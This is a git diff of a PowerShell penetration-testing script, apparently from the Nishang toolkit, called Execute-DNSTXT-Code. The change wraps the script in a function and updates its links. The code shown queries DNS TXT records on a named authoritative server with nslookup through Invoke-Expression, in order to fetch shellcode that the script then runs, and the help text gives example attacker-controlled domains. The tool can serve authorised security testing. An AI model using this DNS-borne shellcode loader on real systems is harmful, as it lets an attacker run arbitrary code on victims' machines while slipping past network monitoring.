@@ -20,16 +20,16 @@ Authoritative Name Server for the domains.
 
 
 .EXAMPLE
-PS > .\ Execute-DNSTXT-Code.ps1
+PS > Execute-DNSTXT-Code
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > .\ Execute-DNSTXT-Code.ps1 32.alteredsecurity.com 64.alteredsecurity.com ns8.zoneedit.com
+PS > Execute-DNSTXT-Code 32.alteredsecurity.com 64.alteredsecurity.com ns8.zoneedit.com
 Use above from non-interactive shell.
 
 .LINK
 http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 
 .NOTES
 The code execution logic is based on this post by Matt.
@@ -37,12 +37,23 @@ http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
 #>
 
 
-Param( [Parameter(Position = 0, Mandatory = $True)] [String]$shellcode32,
-[Parameter(Position = 1, Mandatory = $True)] [String]$shellcode64,
-[Parameter(Position = 2, Mandatory = $True)] [String]$AuthNS)
 
 function Execute-DNSTXT-Code
 {
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $ShellCode32,
+
+        [Parameter(Position = 1, Mandatory = $True)]
+        [String]
+        $ShellCode64,
+
+        [Parameter(Position = 2, Mandatory = $True)]
+        [String]
+        $AuthNS
+    )
+
     $code = (Invoke-Expression "nslookup -querytype=txt $shellcode32 $AuthNS")  
     $tmp = $code | select-string -pattern "`"" 
     $tmp1 = $tmp -split("`"")[0] 
@@ -77,4 +88,3 @@ function Execute-DNSTXT-Code
     }
 }
 
- Execute-DNSTXT-Code
